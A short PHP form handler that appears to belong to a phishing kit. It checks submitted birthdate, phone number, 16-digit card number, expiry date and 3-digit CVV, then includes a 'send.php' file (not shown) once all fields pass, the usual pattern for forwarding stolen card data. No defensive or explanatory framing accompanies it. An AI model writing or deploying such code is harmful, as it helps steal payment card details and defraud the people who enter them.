<?php
if($_POST[set] == "ok"){
$error = "0";
$src = $_POST[image];
if(strlen($_POST[Bday]) !== 2 or $_POST[Bday] > 31){
$StyleBday = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if(strlen($_POST[Bmoth]) !== 2 or $_POST[Bmoth] > 12){
$StyleBmoth = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if(strlen($_POST[Byear]) !== 4 or $_POST[Byear] > 2000){
$StyleByear = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if(empty($_POST[Ntel])){
$StyleNtel = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if(strlen($_POST[Ncarte]) !== 16){
$StyleNcarte = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if(empty($_POST[Exmoth])){
$StyleExmoth = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if($_POST[Exmoth] < gmdate("m") and $_POST[Exyear] == gmdate("Y")){
$StyleExmoth = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if(empty($_POST[Exyear])){
$StyleExyear = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if(strlen($_POST[Cvv]) !== 3){
$StyleCvv = 'style="border-color: rgba(192, 0, 0, 0.5);"';
$error = "1";
}
if($error == "0"){
include "send.php";
exit;
}
}else{

}
?>